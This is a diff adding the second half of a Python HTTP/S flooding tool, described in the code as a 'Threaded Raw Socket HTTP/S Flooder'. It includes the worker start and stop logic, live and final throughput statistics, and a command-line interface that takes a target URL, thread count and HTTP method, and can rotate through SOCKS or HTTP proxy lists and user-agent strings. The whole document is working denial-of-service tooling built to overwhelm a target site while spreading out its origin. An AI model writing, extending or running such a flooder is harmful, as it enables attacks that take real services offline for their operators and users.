@@ -390,4 +390,161 @@ class ThreadedFlooder:
                  logger.info(
                     f"\033[38;5;39mSuccess={current_success} \033[37m{success_rate:.1f}% \033[0m")
                  logger.info(
-                    f"\033[32mErrors={current_errors}{error_rate:.1f}% \033[37mConnErrs={current_conn_err}\033
+                    f"\033[32mErrors={current_errors}{error_rate:.1f}% \033[37mConnErrs={current_conn_err}\033[0m")
+                 logger.info(
+                    f"\033[37mRPS={rps_interval:.2f} \033[37mavg: {rps_total:.2f}\033[0m")
+                 logger.info(
+                    f"\033[38;5;37mSent={mb_sent:.2f} MB \033[37m{mbps:.2f} Mbps\033[0m")
+                 
+                 last_req_count = current_req_count
+                 last_time = now
+            except Exception as e:
+                 logger.error(f"Stats reporter error: {e}", exc_info=True)
+                 time.sleep(STATS_INTERVAL)
+
+    def _signal_handler(self, signum, frame):
+        if self.running:
+            sig_name = getattr(signal, f'SIG{signal.Signals(signum).name}', f'Signal {signum}')
+            logger.warning(f"{sig_name} received! Stopping workers and reporter...")
+            self.stop()
+    def start(self):
+        if self.proxy_manager.proxy_type != 'direct' and self.proxy_manager.get_proxy_count() == 0:
+             if self.proxy_manager.proxy_file:
+                 logger.error(f"No valid proxies were loaded from {self.proxy_manager.proxy_file}. Exiting.")
+             else:
+                 logger.error("Proxy usage requested but no proxy file or no proxies loaded. Exiting.")
+             return
+        logger.info(f"Starting {self.num_workers} workers for {self.target_url}")
+        logger.info(f"Method: {self.http_method}, Proxy Type: {self.proxy_manager.proxy_type or 'direct'}")
+        logger.info(f"Requests/Conn: {REQUESTS_PER_CONNECTION}, Connect Timeout: {CONNECT_TIMEOUT}s")
+        self.running = True
+        self.start_time = time.time()
+        signal.signal(signal.SIGINT, self._signal_handler)
+        signal.signal(signal.SIGTERM, self._signal_handler)
+        self.stats_thread = threading.Thread(target=self.stats_reporter, name="StatsReporter", daemon=True)
+        self.stats_thread.start()
+        futures = [self.executor.submit(self.flood_task) for _ in range(self.num_workers)]
+        logger.info(f"{len(futures)} worker tasks submitted to ThreadPoolExecutor.")
+        try:
+            while self.running:
+                time.sleep(1)
+        except KeyboardInterrupt:
+             logger.info("KeyboardInterrupt in main loop.")
+             self.stop()
+        except Exception as e:
+             logger.critical(f"Critical error in main loop: {e}", exc_info=True)
+             self.stop()
+        finally:
+             if self.running:
+                 self.stop()
+             logger.info("Main loop finished.")
+
+    def stop(self):
+        if not self.running: return
+        logger.info("Initiating shutdown...")
+        self.running = False
+        logger.info("Shutting down thread pool executor...")
+        self.executor.shutdown(wait=True, cancel_futures=False)
+        logger.info("Executor shutdown complete.")
+        if self.stats_thread and self.stats_thread.is_alive():
+             logger.info("Waiting for stats reporter thread...")
+             self.stats_thread.join(timeout=STATS_INTERVAL + 1)
+             if self.stats_thread.is_alive():
+                  logger.warning("Stats reporter thread did not exit cleanly.")
+        logger.info("Shutdown sequence finished.")
+        self.print_final_stats()
+
+    def print_final_stats(self):
+        runtime = time.time() - self.start_time
+        with self._lock:
+            final_req_count = self.request_count
+            final_success = self.success_count
+            final_errors = self.error_count
+            final_conn_err = self.connection_errors
+            final_bytes = self.bytes_sent
+        rps = final_req_count / runtime if runtime > 0 else 0
+        success_rate = (final_success / final_req_count * 100) if final_req_count > 0 else 0
+        error_rate = (final_errors / final_req_count * 100) if final_req_count > 0 else 0
+        mb_sent = final_bytes / (1024 * 1024)
+        mbps = (mb_sent * 8) / runtime if runtime > 0 else 0
+        print("\n" + "="*20 + " Final Statistics " + "="*20)
+        print(f"Target URL:          {self.target_url}")
+        print(f"Total Runtime:       {runtime:.2f} seconds")
+        print(f"Total Req Attempts:  {final_req_count}")
+        print(f"Successful Requests: {final_success} ({success_rate:.1f}%)")
+        print(f"Failed Requests:     {final_errors} ({error_rate:.1f}%)")
+        print(f"Connection Errors:   {final_conn_err}")
+        print(f"Requests Per Second: {rps:.2f} (Average)")
+        print(f"Total Data Sent:     {mb_sent:.2f} MB")
+        print(f"Avg. Bandwidth Sent: {mbps:.2f} Mbps")
+        print("="*58)
+
+def main():
+    global CONNECT_TIMEOUT, READ_WRITE_TIMEOUT, REQUESTS_PER_CONNECTION, STATS_INTERVAL, INTER_REQUEST_SLEEP, FAIL_SLEEP
+    parser = argparse.ArgumentParser(
+        description='Threaded Raw Socket HTTP/S Flooder - Optimized',
+        formatter_class=argparse.ArgumentDefaultsHelpFormatter
+    )
+    parser.add_argument('url', type=str, help='Target URL (e.g., https://example.com)')
+    parser.add_argument('workers', type=int, help='Number of concurrent worker threads')
+    parser.add_argument('http_method', type=str, choices=['get', 'post'], help='HTTP method')
+    parser.add_argument('--proxy-type', type=str, default='direct',
+                        choices=['http', 'https', 'socks4', 'socks5', 'direct'], help='Proxy type')
+    parser.add_argument('--proxy-file', type=str, default=None,
+                        help='File containing proxies (host:port). Required if --proxy-type is not direct.')
+    parser.add_argument('--user-agents', type=str, default=DEFAULT_USER_AGENTS_FILE,
+                        help='File containing User-Agent strings')
+    parser.add_argument('--connect-timeout', type=int, default=CONNECT_TIMEOUT,
+                        help='Connection establishment timeout (seconds)')
+    parser.add_argument('--rw-timeout', type=int, default=READ_WRITE_TIMEOUT,
+                        help='Socket read/write operations timeout (seconds)')
+    parser.add_argument('--reqs-per-conn', type=int, default=REQUESTS_PER_CONNECTION,
+                        help='Max requests per keep-alive connection')
+    parser.add_argument('--stats-interval', type=int, default=STATS_INTERVAL,
+                        help='Interval for printing stats (seconds)')
+    parser.add_argument('--inter-request-sleep', type=float, default=INTER_REQUEST_SLEEP,
+                        help='Sleep time between requests on same connection (seconds, 0 to yield only)')
+    parser.add_argument('--fail-sleep', type=float, default=FAIL_SLEEP,
+                        help='Sleep time after a connection failure (seconds)')
+    args = parser.parse_args()
+
+    CONNECT_TIMEOUT = args.connect_timeout
+    READ_WRITE_TIMEOUT = args.rw_timeout
+    REQUESTS_PER_CONNECTION = args.reqs_per_conn
+    STATS_INTERVAL = args.stats_interval
+    INTER_REQUEST_SLEEP = args.inter_request_sleep
+    FAIL_SLEEP = args.fail_sleep
+
+    if args.proxy_type != 'direct' and not args.proxy_file:
+        print("Error: --proxy-file is required when --proxy-type is not 'direct'", file=sys.stderr)
+        sys.exit(1)
+    if args.proxy_type == 'direct' and args.proxy_file:
+        print("Warning: --proxy-file specified but --proxy-type is 'direct'. File ignored.", file=sys.stderr)
+        args.proxy_file = None
+
+    try:
+        resource_manager = ResourceManager(user_agents_file=args.user_agents)
+        proxy_manager = ThreadGroupProxyManager(proxy_type=args.proxy_type, proxy_file=args.proxy_file)
+        flooder = ThreadedFlooder(
+            target_url=args.url,
+            num_workers=args.workers,
+            http_method=args.http_method,
+            proxy_manager=proxy_manager,
+            resource_manager=resource_manager
+        )
+    except Exception as e:
+        logger.error(f"Initialization failed: {e}", exc_info=True)
+        sys.exit(1)
+
+    flooder.start()
+
+if __name__ == '__main__':
+    import os
+    if not os.path.exists('default'): os.makedirs('default', exist_ok=True)
+    ua_path = 'default/useragents.txt'
+    if not os.path.exists(ua_path):
+        print(f"Creating dummy user agent file: {ua_path}")
+        with open(ua_path, 'w') as f:
+            f.write("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\n")
+            f.write("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1\n")
+    main()
